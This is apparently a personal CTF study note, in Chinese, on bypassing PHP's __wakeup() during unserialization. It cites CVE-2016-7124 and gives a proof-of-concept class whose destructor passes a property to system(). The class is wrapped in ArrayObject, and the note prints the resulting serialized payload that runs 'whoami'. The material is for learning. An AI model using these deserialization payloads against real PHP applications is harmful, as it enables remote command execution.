详细看[PHP反序列化中wakeup()绕过总结 – fushulingのblog](https://fushuling.com/index.php/2023/03/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADwakeup%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/)

## 1. cve-2016-7124
`对象的属性个数大于实际个数
    影响范围：

- PHP5 < 5.6.25
- PHP7 < 7.0.10

![500](assets/绕过wakeup/file-20251216150800004.png)

## 2. C绕过
直接把O改为C只能只能构造和析构，我们可以把类放入数组，利用new ArraryObject，打包
    

```php
<?php

class ctfshow {
    public $ctfshow;
    
    public function __wakeup(){
        die("not allowed!");
    }
    
    public function __destruct(){
        echo "OK";
        system($this->ctfshow);
    }
}
$a=new ctfshow;
$a->ctfshow="whoami";
$arr=array("evil"=>$a);
$oa=new ArrayObject($arr);
$res=serialize($oa);
echo $res;
//unserialize($res)
?>
#C:11:"ArrayObject":77:{x:i:0;a:1:{s:4:"evil";O:7:"ctfshow":1:{s:7:"ctfshow";s:6:"whoami";}};m:a:0:{}}
```

```php
ArrayObject::unserialize
ArrayIterator::unserialize
RecursiveArrayIterator::unserialize
SplObjectStorage::unserialize
//这些类也是以C开头
```